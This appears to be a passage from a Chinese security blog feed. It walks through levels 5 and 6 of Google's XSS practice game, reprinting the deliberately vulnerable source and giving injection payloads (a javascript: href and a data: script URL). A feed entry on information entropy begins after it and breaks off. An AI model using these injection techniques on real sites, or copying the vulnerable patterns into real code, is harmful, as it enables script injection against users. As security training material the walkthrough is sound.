class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Thanks for signing up, you will be redirected soon...    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'&#123;&#123; next &#125;&#125;'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token comment"># Route the request to the appropriate template</span>    <span class="token keyword">if</span> <span class="token string">"signup"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'signup.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"confirm"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'confirm.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'welcome'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'welcome.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Signup.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- We're ignoring the email, but the poor user will never know! --></span>    Enter email: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reader-email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Welcome.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Welcome! Today we are announcing the much anticipated<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/level5/frame/signup?next=confirm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Sign up<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     for an exclusive Beta.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>直接讲next参数填入html，href也是可以执行JavaScript代码的</p><p>payload：</p><pre class="language-none"><code class="language-none">next&#x3D;javascript:alert(1);</code></pre><p>然后点<code>Next&gt;&gt;</code>就行</p><img src="/article/xss/image-20210424163533941.png" class="" title="level5-1" loading="lazy"><img src="/article/xss/85F04A35-370A-4FD5-9526-C80E89A2546A.png" class="" title="level5-2" loading="lazy"><blockquote><p>超链接标签<code>&lt;a&gt;</code>,用户点击相应按钮时可以跳转到新的页面（执行某个JavaScript），用到了这样的代码结构：</p><p><code>&lt;a href=&#39;javascript:doSomething()&#39;&gt;...&lt;/a&gt;</code></p><p>执行权首先落在doSomething()函数，若存在返回值则将返回值返给超链接进行合成</p></blockquote><hr><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="https://xss-game.appspot.com/level6/frame#/static/gadget.js">https://xss-game.appspot.com/level6/frame#/static/gadget.js</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">setInnerText</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>element<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// This will totally prevent us from loading evil URLs!</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Load this awesome gadget</span>      scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>       <span class="token comment">// Show log messages</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Loaded gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Couldn't load gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// Take the value after # and use it as the gadget filename.</span>    <span class="token keyword">function</span> <span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"/static/gadget.js"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Extra code so that we can communicate with the parent page</span>    window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level6.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cube<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level6_cube.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Loading gadget...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>gadget.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* This is a completely awesome invisible gadget */</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This will totally prevent us from loading evil URLs!</span><span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Load this awesome gadget</span>scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span></code></pre><p>直接加载外部脚本，如图所示</p><img src="/article/xss/image-20210424165312513.png" class="" title="level6-1" loading="lazy"><p>既然没有任何过滤，那就直接用data数据流加载即可</p><p>RFC2397对data数据流有过定义 <a href="https://tools.ietf.org/html/rfc2397">https://tools.ietf.org/html/rfc2397</a></p><p><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p><p>payload:</p><pre class="language-none"><code class="language-none">data:text&#x2F;plain,alert(1);</code></pre><img src="/article/xss/image-20210424165650678.png" class="" title="level6-2" loading="lazy"><img src="/article/xss/image-20210424165707701.png" class="" title="level6-3" loading="lazy"><hr><p>学习了基本的Cross-site scripting (XSS)</p><p>跨站点脚本（XSS）是一个安全漏洞，可能会影响网站。 这个漏洞可能使攻击者可以将自己的恶意JavaScript代码添加到显示给用户的HTML页面上。 一旦被害者的浏览器访问，此代码便可以执行，改变网站的行为或外观，窃取私人数据或代表用户执行操作等等</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;谷歌的小游戏，复习一下xss&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="XSS" scheme="https://err0r.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>熵和信息的学习</title>
    <link href="https://err0r.top/article/entropy/"/>
    <id>https://err0r.top/article/entropy/</id>
    <published>2021-04-12T05:27:56.000Z</published>
    <updated>2021-05-03T07:09:57.730Z</updated>
    
    <content type="html"><![CDATA[<p>摸鱼的学习总结，搞作品赛必须的理论学习…</p><a id="more"></a><blockquote><p><strong>信息是从多个可能状态中确定实际状态的代价</strong></p></blockquote><p>有些平台的回答挺好的，建议看看参考链接</p><img src="/article/entropy/640" class="" title="Entropy" loading="lazy"><p><strong>例子：How much is the shirt?</strong></p><p><strong>衬衫的价格是9磅15便士，所以你选择B项，答案却是C项。</strong></p><h2 id="信息熵"><a href="#信息熵" class="headerlink" title="信息熵"></a>信息熵</h2><p>当一件事情(宏观态)有很多种可能的情况时，这件事情(宏观态)对某人(观察者)而言具体是哪种情况(微观态)的不确定性叫做熵.</p><p>即这(知情情况的不确定性)就是熵</p><img src="/article/entropy/image-20210412143856985.png" class="" title="熵" loading="lazy"><p>而能<strong>消除这种不确定性的事物</strong>就是信息</p><img src="/article/entropy/image-20210412144408346.png" class="" title="信息" loading="lazy"><h2 id="信息量"><a href="#信息量" class="headerlink" title="信息量"></a>信息量</h2><p>熵和信息的增减数量相等，获取信息的同时也会消除不确定性(熵)</p><blockquote><p><strong>消除</strong>熵 == <strong>获取</strong>信息</p></blockquote><p>例如在举例中，ABCD四个选项对于不知道最终答案的人来说都是等概率(25%)的，熵在此时(等概率)最大。</p><p>而告诉你答案是C的时候，这时熵最小。</p><p>能够消除熵的信息有三种类型，本质都是能够<strong>正确</strong>的调整每个可能情况的概率。</p><p>如果告诉你<code>&quot;答案是ABCD中的一个&quot;</code>则获取了0bit的信息，这种定义下，没有假信息的说法。只有能消除某人对某事不确定性的事物才叫做信息，即<code>&quot;答案是ABCD中的一个&quot;</code>不是信息</p><img src="/article/entropy/image-20210412152143538.png" class="" title="ABCD" loading="lazy"><p>而告诉你<code>&quot;A是正确答案&quot;</code>也不是信息(正确答案为C)，因为它不是正确的。</p><img src="/article/entropy/image-20210412152302898.png" class="" title="A" loading="lazy"><h3 id="类型一：调整概率"><a href="#类型一：调整概率" class="headerlink" title="类型一：调整概率"></a>类型一：调整概率</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中张三得知<code>&quot;有一半可能是C选项&quot;</code>，这个信息将C选项的概率提高到了50%(提供了0.21bits)</p><img src="/article/entropy/image-20210412153329273.png" class="" title="halfC" loading="lazy"><h3 id="类型二：排除干扰"><a href="#类型二：排除干扰" class="headerlink" title="类型二：排除干扰"></a>类型二：排除干扰</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，从这个消息中李四得知<code>&quot;B选项是错的&quot;</code>，这个信息直接将B选项概率降低到0%(0.415bits)</p><img src="/article/entropy/image-20210412153709078.png" class="" title="exclueB" loading="lazy"><h3 id="类型三：确定情况"><a 